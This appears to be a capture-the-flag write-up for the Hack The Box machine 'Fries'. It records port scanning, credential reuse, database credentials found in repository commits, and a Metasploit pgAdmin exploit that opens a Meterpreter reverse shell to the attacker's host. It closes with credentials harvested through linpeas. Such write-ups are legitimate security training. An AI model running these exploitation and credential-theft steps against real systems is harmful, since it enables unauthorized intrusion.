---
created: 2026-03-13
modified: 2026-03-13
---

![[Pasted_image_20251127163644.png]]

we have initial credentials 

```
Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : d.cooper@fries.htb / D4LE11maan!!
```

## Port Scan

```bash
sudo nmap -Pn -sCV -p- --min-rate 3000 -T3 -oN fries-port-scan 10.10.11.96
[sudo] password for darklight:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 16:46 EAT
Nmap scan report for 10.10.11.96
Host is up (0.78s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-27 20:49:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T20:50:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn''t have a title (text/html;charset=ISO-8859-1).
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-nextprotoneg:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T20:50:56+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T20:50:56+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T20:50:56+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2025-11-18T05:39:19
|_Not valid after:  2105-11-18T05:39:19
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49950/tcp open  msrpc         Microsoft Windows RPC
49981/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-11-27T20:50:18
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 277.15 seconds
```

We add the hosts to the host files

```bash
echo '10.10.11.96 fries.htb DC01.fries.htb pwm.fries.htb' | sudo tee -a /etc/hosts
10.10.11.96 fries.htb DC01.fries.htb pwm.fries.htb
```

Credentials are not valid in the Domain controller

```bash
┌──(darklight💀ataraxia)-[~/…/ctf/htb/machines/fries]
└─$ nxc smb DC01.fries.htb -u 'd.cooper' -p 'D4LE11maan!!'
SMB         10.10.11.96     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.96     445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE

┌──(darklight💀ataraxia)-[~/…/ctf/htb/machines/fries]
└─$ nxc ldap DC01.fries.htb -u 'd.cooper' -p 'D4LE11maan!!'
LDAP        10.10.11.96     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb)
LDAP        10.10.11.96     389    DC01             [-] fries.htb\d.cooper:D4LE11maan!!
```


### Port 80

![[Pasted_image_20251128001254.png]]

We have few directories in the navbar but none has anything interesting 

We identify one subdomain 

![[Pasted_image_20251128001856.png]]

![[Pasted_image_20251128002140.png]]

Down the page we have a version number 

![[Pasted_image_20251128002210.png]]

Also the initial credentials does work on this page.

![[Pasted_image_20251128002731.png]]

Reading the README.md file, i discover another subdomain, `http://db-mgmt05.fries.htb`

![[Pasted_image_20251128002659.png]]

On the subdomain runs pgAdmin4

![[Pasted_image_20251128003043.png]]

With the initial credentials we can access the site

![[Pasted_image_20251128003814.png]]

Also reading through the commits i get this, database credentials `DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db`

![[Pasted_image_20251128003349.png]]

We can use `exploit/multi/http/pgadmin_query_tool_authenticated` module to get a shell

```bash

msf > use exploit/multi/http/pgadmin_query_tool_authenticated
[*] Using configured payload python/meterpreter/reverse_tcp
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set RHOSTS db-mgmt05.fries.htb
RHOSTS => db-mgmt05.fries.htb
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set USERNAME d.cooper@fries.htb
USERNAME => d.cooper@fries.htb
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set PASSWORD D4LE11maan!!
PASSWORD => D4LE11maan!!
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set DB_USER root
DB_USER => root
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set DB_PASS PsqLR00tpaSS11
DB_PASS => PsqLR00tpaSS11
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set DB_NAME ps_db
DB_NAME => ps_db
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set LHOST 10.10.16.112
LHOST => 10.10.16.112
msf exploit(multi/http/pgadmin_query_tool_authenticated) > set LPORT 4444
LPORT => 4444
msf exploit(multi/http/pgadmin_query_tool_authenticated) > exploit
[*] Started reverse TCP handler on 10.10.16.112:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (23408 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.16.112:4444 -> 10.10.11.96:49834) at 2025-11-28 00:51:21 +0300

meterpreter > getuid
Server username: pgadmin
```

Seems we are in a container 

```bash
cb46692a4590:/pgadmin4$ hostname
hostname
cb46692a4590
cb46692a4590:/pgadmin4$
```


running `linpeas.sh` i get this 

```bash
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
```

We can login using the creds.

